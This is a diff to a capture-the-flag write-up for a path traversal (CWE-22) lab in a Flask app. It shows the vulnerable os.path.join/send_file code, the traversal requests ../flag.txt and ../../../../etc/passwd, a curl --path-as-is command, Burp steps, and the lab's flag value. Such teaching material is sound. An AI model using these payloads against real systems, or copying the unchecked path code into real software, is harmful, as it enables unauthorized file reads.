@@ -7,33 +7,34 @@
 `app/routes.py` builds the file path like this:
 
 ```python
-target_path = os.path.join(DOCUMENTS_DIR, file)   # file comes from the user
+documents_dir = current_app.config["DOCUMENTS_DIR"]
+target_path = os.path.join(documents_dir, name)   # name comes from the user
 ...
 return send_file(target_path, as_attachment=False)
 ```
 
 `os.path.join` resolves `..` components, and the code never checks that the
-final path stays inside `DOCUMENTS_DIR`. That is a textbook path traversal
-(CWE-22): the `file` parameter can walk *up* out of the intended directory.
+final path stays inside `documents_dir`. That is a textbook path traversal
+(CWE-22): the `name` parameter can walk *up* out of the intended directory.
 
 ## Exploitation
 
 Normal, intended request:
 
 ```
-GET /docs/download?file=welcome.txt
+GET /docs?name=welcome.txt
 ```
 
 Escape the `docs/` directory to read the flag one level up:
 
 ```
-GET /docs/download?file=../flag.txt
+GET /docs?name=../flag.txt
 ```
 
 With `curl`:
 
 ```bash
-curl --path-as-is "http://localhost:5000/docs/download?file=../flag.txt"
+curl --path-as-is "http://localhost:5000/docs?name=../flag.txt"
 ```
 
 > `--path-as-is` stops curl from normalizing `../` before sending.
@@ -41,8 +42,12 @@ curl --path-as-is "http://localhost:5000/docs/download?file=../flag.txt"
 Expected output:
 
 ```
-FLAG{fetchly_p4th_tr4v3rs4l_l3v3l_1}
+FLAG{P4TH_TR4V3RS4L_L3V3L_1}
 ```
+
+> The flag is **not** in the repo on purpose — it is created inside the Docker
+> image at build time (see the `Dockerfile`). You have to actually exploit the
+> traversal against the running container to read it.
 
 ### Going further
 
@@ -50,7 +55,7 @@ Because there is no filtering at all, you can keep walking up and read files
 from the container filesystem, e.g.:
 
 ```
-GET /docs/download?file=../../../../etc/passwd
+GET /docs?name=../../../../etc/passwd
 ```
 
 (Inside the hardened container this reads the container's own `/etc/passwd`,
@@ -61,7 +66,7 @@ not your host's — which is the point of running labs in Docker.)
 1. Proxy your browser through Burp and load <http://localhost:5000>.
 2. Click **Download** on any document — capture the request in **Proxy > HTTP history**.
 3. Send it to **Repeater**.
-4. Change the `file` parameter to `../flag.txt` and send.
+4. Change the `name` parameter to `../flag.txt` and send.
 5. Observe the flag in the response.
 
 Try fuzzing the parameter with **Intruder** using a path-traversal wordlist
